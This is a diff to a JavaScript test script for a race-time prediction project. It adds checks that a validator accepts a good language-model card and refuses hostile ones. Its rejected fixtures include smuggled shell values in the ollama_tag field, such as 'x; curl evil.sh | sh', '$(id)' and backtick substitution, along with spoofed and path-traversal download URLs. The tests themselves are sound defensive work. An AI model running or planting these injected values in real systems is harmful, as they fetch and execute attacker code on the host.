@@ -3,7 +3,7 @@
 // original code (src/pacemodel.js, src/shortmodel.js, src/marathon.js in github.com/jakecapmeil/hawks) predicted for them.
 //   npm run check
 import { readFileSync } from 'node:fs';
-import { BUILTIN, predictEvent, marathonPredict, tandaPredict, toCourse, toFlat, modelSet, validateModel, ModelError } from '../src/models.js';
+import { BUILTIN, TASKS, predictEvent, marathonPredict, tandaPredict, toCourse, toFlat, modelSet, validateModel, ModelError } from '../src/models.js';
 import { VC_FACTOR } from '../src/train/conditions.js';
 import { EVENT } from '../src/events.js';
 
@@ -106,5 +106,44 @@ const bad = [
 for (const b of bad) {
   try { validateModel(b); fails++; console.log('bad model accepted', b.kind); } catch (e) { if (!(e instanceof ModelError)) { fails++; console.log('wrong error', e); } }
 }
-console.log(fails ? `FAIL (${fails})` : `ok: ${compared} predictions match the reference and validation holds`);
+// Language-model cards (kind llm): a good card is accepted and cleaned; hostile ones are refused; and a card can never be
+// picked for a prediction purpose, because `coach` is not one of TASKS.
+{
+  const card = JSON.parse(readFileSync(new URL('../models/llm-card.example.json', import.meta.url)));
+  let clean;
+  try { clean = validateModel({ ...card, weights: { ...card.weights, junk: 'dropped' } }); } catch (e) { fails++; console.log('good llm card refused', e.message); }
+  if (clean && 'junk' in clean.weights) { fails++; console.log('llm card kept an unknown field'); }
+  const w = card.weights;
+  const llmBad = [
+    { ...card, license: '' },
+    { ...card, trained_on: '' },
+    { ...card, task: 'race' },
+    { ...card, weights: { ...w, tier: 'giant' } },
+    { ...card, weights: { ...w, params_b: 0 } },
+    { ...card, weights: { ...w, active_params_b: 99 } },
+    { ...card, weights: { ...w, ram_gb: -1 } },
+    { ...card, weights: { ...w, hf_url: 'http://huggingface.co/a/b' } },
+    { ...card, weights: { ...w, hf_url: 'https://evil.example/a/b' } },
+    { ...card, weights: { ...w, hf_url: 'https://huggingface.co.evil.example/a/b' } },
+    { ...card, weights: { ...w, hf_url: 'https://huggingface.co/a/b?download=1' } },
+    { ...card, weights: { ...w, hf_url: 'https://huggingface.co/../etc' } },
+    { ...card, weights: { ...w, ollama_tag: 'x; curl evil.sh | sh' } },
+    { ...card, weights: { ...w, ollama_tag: 'x y' } },
+    { ...card, weights: { ...w, ollama_tag: 'x$(id)' } },
+    { ...card, weights: { ...w, ollama_tag: 'x`id`' } },
+    { ...card, weights: { ...w, ollama_tag: 'x&y' } },
+    { ...card, weights: { ...w, hf_url: undefined, ollama_tag: undefined } },
+    { ...card, weights: { ...w, quants: ['q4 k'] } },
+    { ...card, weights: { ...w, eval: { pass_rate: 1.5 } } },
+    { ...card, weights: { ...w, eval: { date: 'today' } } },
+    { ...card, weights: { ...w, safety_notes: 'x'.repeat(1001) } },
+  ];
+  for (const b of llmBad) {
+    try { validateModel(b); fails++; console.log('bad llm card accepted', JSON.stringify(b.weights).slice(0, 120)); } catch (e) { if (!(e instanceof ModelError)) { fails++; console.log('wrong error', e); } }
+  }
+  compared += 1 + llmBad.length;
+  if (TASKS.coach) { fails++; console.log('coach must not be a model task: a language model could be picked for a prediction'); }
+}
+
+console.log(fails ? `FAIL (${fails})` : `ok:${compared} predictions match the reference and validation holds`);
 process.exit(fails ? 1 : 0);
